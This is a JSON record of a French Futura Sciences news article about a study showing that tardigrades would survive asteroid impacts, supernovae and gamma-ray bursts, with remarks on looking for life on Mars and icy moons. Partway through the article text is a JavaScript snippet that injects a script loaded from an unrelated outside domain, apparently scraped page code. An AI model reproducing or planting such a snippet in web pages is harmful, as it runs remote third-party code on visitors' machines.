{"title": "Les tardigrades seront les derniers survivants sur Terre", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-07-17", "content": "Des chercheurs ont voulu savoir ce qu'il se passerait dans le cas ou de grands cataclysmes d'origine cosmique survenaient sur Terre. Resultat : la ou l'Homme ne survivrait pas, les tardigrades, connus pour leur incroyable resistance lorsqu'ils sont soumis a des conditions extremes, resteraient invaincus. Ce qu'il faut retenir Beaucoup d'etudes se sont interessees aux effets sur l'Homme d'evenements cosmiques catastrophiques comme la chute d'un asteroide, l'explosion d'une supernova ou des sursauts gamma, mais tres peu ont examine la resilience de la vie elle-meme. Des chercheurs ont evalue la resistance des tardigrades, creatures quasi indestructibles, face a de tels cataclysmes. Aucun ne risque de se produire ou ne serait assez proche pour les detruire. La vie semble plus resistante qu'on ne le pensait.  << Il est difficile d'eliminer toutes les formes de vie d'une planete habitable >>. Les  tardigrades  survivront bien plus longtemps que l'essentiel des formes de vie sur  Terre . C'est ce que montre une etude realisee par trois chercheurs de l'universite d'Oxford et du  Harvard-Smithsonian Center for Astrophysics . Celle-ci vient de paraitre dans  Scientific Reports . En effet, pour les rayer de notre monde, il faudrait un evenement capable de faire  bouillir les oceans  -- ce qui devrait se produire dans environ un milliard d'annees, voire plus, sous le joug de notre  soleil  en declin. Autrement, ces petites creatures a huit pattes d'un demi-millimetre de long et surnommees oursons d'eau n'ont pas de  soucis  a se faire. Pour les trois auteurs, David Sloan, Rafael Alves Batista et Abraham Loeb,  Milnesium tardigradum  n'a pas a trembler devant d'eventuels cataclysmes venus du ciel, que ce soit des  asteroides , l'explosion d'une  supernova  ou des  sursauts  gamma. D'apres leurs recherches, aucun de ces phenomenes ne represente une menace suffisante pour annihiler cette  espece  quasi indestructible et, de fait, steriliser la Terre. Le saviez-vous ? Les tardigrades (dont le nom signifie << marcheurs lents >>) sont les formes de vie les plus resistantes sur Terre. Par exemple, recemment des chercheurs ont pu  reveiller deux individus et un oeuf apres 30 ans passe a -30 degC  en etat de << vie arretee >>, ou cryptobiose. Ils sont capables d'endurer des temperatures superieures a 150 degC, des pressions elevees jusqu'a 300 fois celle de l'atmosphere terrestre, de resister a des doses mortelles de rayons ultraviolets, ou encore de survivre au vide spatial. Cette incroyable petite creature de 0,5 mm de long est capable de vivre jusqu'a 60 ans. Les chercheurs n'ont pas fini de decouvrir ses prouesses. Ces trois sources  astrophysiques  sont les seules considerees comme capables d'eradiquer totalement la vie sur une planete de type terrestre. Or, d'apres leurs modeles et les donnees dont les astronomes disposent, aucune d'entre elles ne menace directement notre  biosphere .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Asteroides, supernovae et sursauts gamma Pour le cas des  asteroides , meme si nous en connaissons plusieurs milliers qui sont potentiellement dangereux et croisent regulierement l' orbite  de notre planete, aucun ne possede une  masse  suffisante pour faire bouillir les oceans en cas d'impact. En realite, seuls douze objets dans notre  Systeme solaire  ont ete identifies comme capables d'un tel cataclysme : des asteroides comme  Vesta , le plus gros de tous, dans la ceinture principale, ou des  planetes naines  comme  Pluton . Les  tardigrades , et nous avec, n'ont pas a s'inquieter : pas un seul de ces corps celestes n'empruntera un jour une trajectoire de collision avec la Terre. (Quoique, si une  etoile  venait a traverser notre Systeme solaire, comme par exemple  Gliese 710  dans un million d'annees, celle-ci pourrait semer la zizanie et precipiter plusieurs asteroides et  cometes  dans le systeme interne ; toutefois, ce ne serait vraisemblablement pas un corps de l'acabit de Pluton ou  Ceres ...) En ce qui concerne d'eventuelles menaces de  supernovae , d'autres evenements astronomiques puissants qui seraient en mesure de steriliser la Terre, que l'on se rassure aussi : il faudrait que l'etoile qui explose soit a moins de 0,14  annee-lumiere , autrement dit a l'interieur de notre Systeme solaire, a quelque 1.300 milliards de km. Rien de tel ne risque d'arriver. Notre voisine,  Proxima du Centaure , est a plus de 4 annees-lumiere, et il n'y a aucun risque que cette petite  naine rouge  termine sa vie prochainement, encore moins aussi violemment. Il n'y a donc pas une supernova a l'horizon qui menace de nous exterminer. Le risque que cela se produise d'ici la mort du soleil, dans 5 milliards d'annees, est negligeable. Voir aussi : La Terre frappee par les pluies radioactives d'une supernova Enfin, la probabilite que des  sursauts gamma  nous aneantissent est, elle aussi, tres faible. Ces phenomenes tres brefs sont plus rares encore que les supernovae. Il faudrait qu'il y en ait un qui survienne a environ 40 annees-lumiere pour detruire toute forme de vie sur Terre jusqu'aux derniers, les tardigrades... Et, la aussi, rien de tel ne se profile a de si petites distances. << Bien que les supernovae proches ou les gros impacts d'asteroides soient catastrophiques pour les etres humains, les tardigrades pourraient ne pas etre affectes. >>  (c) Sebastian Kaulitzki, Fotolia                               Difficile d'eliminer toutes les formes de vie d'une planete habitable A l'origine de cette etude, les trois chercheurs deploraient que, dans la litterature scientifique, nombre de travaux s'interessaient exclusivement aux effets de ces cataclysmes cosmiques sur l'espece humaine, voire sur l'ensemble des especes terrestres, et si peu sur la  resilience  de la vie elle-meme. \" Il y a beaucoup d'especes plus resistantes [que l'Homme] sur Terre. La vie est susceptible de se poursuivre bien apres notre disparition. Dans cette perspective, cette nouvelle etude montre, certes, que l'Homme est fragile :  << De petits changements dans notre environnement peuvent avoir des consequences dramatiques pour nous >> , souligne le coauteur Rafael Alves Batista. Mais qu'en realite,  << il y a beaucoup d'especes plus resistantes [que l'Homme] sur Terre. La vie est susceptible de se poursuivre bien apres notre disparition >> .  C'est une mauvaise nouvelle pour nous mais, dans le fond, c'est une bonne nouvelle pour la recherche de la vie ailleurs. L'aneantir completement semble donc plus difficile qu'on ne l'imagine !  << Les tardigrades sont presque indestructibles sur Terre. Il est possible qu'il y ait d'autres exemples d'especes resilientes ailleurs dans l' univers , s'enthousiasme le chercheur.  Dans ce contexte, il existe un cas reel pour rechercher la vie sur Mars et dans d'autres domaines du Systeme solaire en general. Si les tardigrades sont les especes les plus resistantes sur Terre, qui sait ce qu'il y a d'autre ailleurs. >> << A notre grande surprise, nous avons constate que, bien que les supernovae proches ou les gros impacts d'asteroides soient catastrophiques pour les etres humains, les tardigrades pourraient ne pas etre affectes. Par consequent, il semble que la vie, une fois qu'elle se deroule, soit difficile a effacer entierement , conclut David Sloan, coauteur et postdoc au departement de  physique  de l'universite d'Oxford.  Un nombre enorme d'especes, ou meme des genres entiers, peuvent disparaitre, mais la vie dans son ensemble continue.  En fait,  il est difficile d'eliminer toutes les formes de vie d'une planete habitable >> .  Les trois chercheurs ont bon espoir que des formes de vie aussi resistantes que ces incroyables  oursons d'eau aux super-pouvoirs  sommeillent dans le sous-sol de Mars, attendant qu'un jour des conditions soient de nouveau reunies pour qu'ils puissent s'alimenter.  << Les organismes ayant des tolerances aux rayonnements et a la temperature  semblables a celles d es tardigrades pourraient survivre a long terme sous la surface dans ces conditions,  releve le professeur Abraham Loeb, coauteur. En outre,  les oceans souterrains que l'on suppose exister sur Europe et  Encelade  [des  lunes  en orbite respectivement autour de  Jupiter  et de  Saturne ,  NDLR ] pourraient avoir des conditions similaires a celles des oceans profonds sur Terre ou l'on trouve des tardigrades, avec des events volcaniques fournissant de la  chaleur  dans un environnement depourvu de lumiere , explique-t-il.  La decouverte d'extremophiles dans de tels endroits serait un grand pas en avant sur la gamme des conditions de vie existant sur les planetes autour d'autres etoiles >>. Des tardigrades filmes en plein accouplement                       Les tardigrades, ou oursons d'eau, sont de prodigieuses creatures. Etudiees depuis 250 ans, celles-ci n'avaient pourtant jamais ete vues en train de s'accoupler. C'est desormais chose faite. Des chercheurs les ont en effet mises en condition et ont pu tout filmer. Attention, dans cette video, nous ne vous montrons qu'un extrait, car leurs ebats durent en realite environ une heure.                                       ", "theme": "planete"}